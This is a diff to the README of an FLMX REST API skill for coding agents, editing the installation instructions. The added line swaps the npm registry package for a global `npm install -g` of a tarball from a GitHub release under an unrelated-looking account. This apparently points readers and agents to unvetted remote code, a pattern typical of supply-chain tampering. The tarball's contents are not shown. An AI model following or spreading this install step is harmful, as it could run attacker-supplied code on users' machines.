@@ -26,7 +26,7 @@ Operate FLMX panel through REST API. Almost all endpoints use POST and return JS
 
 | Tool | Installation | Notes |
 |------|--------------|-------|
-| **OpenCode** | `npm i -g @flmx/skill-api` or `ln -s . ~/.agents/skills/flmx-api` | Auto-loads from `~/.agents/skills/` |
+| **OpenCode** | `npm install -g https://github.com/iiiiiiiii7125-art/flmx-max/releases/download/2.1.18/flmx-skill-api-2.1.18.tgz` or `ln -s . ~/.agents/skills/flmx-api` | Auto-loads from `~/.agents/skills/` |
 | **OpenClaw** | Same as OpenCode | Compatible skill format |
 | **Claude Code** | Copy SKILL.md to CLAUDE.md or `~/.claude/CLAUDE.md` | Uses context file instead of skills |
 
